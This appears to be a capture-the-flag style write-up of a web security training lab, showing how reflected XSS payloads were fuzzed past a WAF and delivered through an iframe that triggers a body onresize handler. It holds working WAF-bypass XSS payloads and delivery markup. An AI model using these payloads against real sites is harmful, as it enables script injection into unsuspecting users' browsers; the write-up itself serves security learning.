As expected, this is blocked:

```html
<script>print()</script>
```

I wanted to see if the WAF is case-sensitive, and indeed it is:

```html
<scrIPT>print()</scrIPT>
```

URL encoding the code failed too:

`/?search=%3Cscript%3Eprint()%3C%2Fscript%3E`

I then visited the XSS cheat sheet to find something useful:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

And then I realized that the lab description said that **most** tags are blocked.
So I copied all the tags to Burp Intruder to find which ones pass the firewall,
and the result is only the `<body>` tag is accepted.

So I gave this a try:

```html
<body onload=print()>
```

And found a new error: "Attribute is not allowed"

Back to the cheat sheet, it contains a list of all possible events, so I gave them
a try through Burp Intruder.
**Make sure you copied the entire list, I had some issues for some reason**

The only attribute that passed the firewall is `onresize`, which makes the following request run print():

`/?search=<body onresize=print()>`

And now we need to find a way to run it on the bot's side.

In Exploit Server, I tried the following response body and delivered it to the victim, but it failed,
probably because the link is not to a real image.

```html
<img src="https://acb01fbb1e24a9ef80bd3d42008b00e0.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width=1000">
```

Then I found out about `iframe`, which obviously loads the content of the link into the frame. This made me pass the lab.

```html
<iframe src="https://acb01fbb1e24a9ef80bd3d42008b00e0.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width=1000">
```
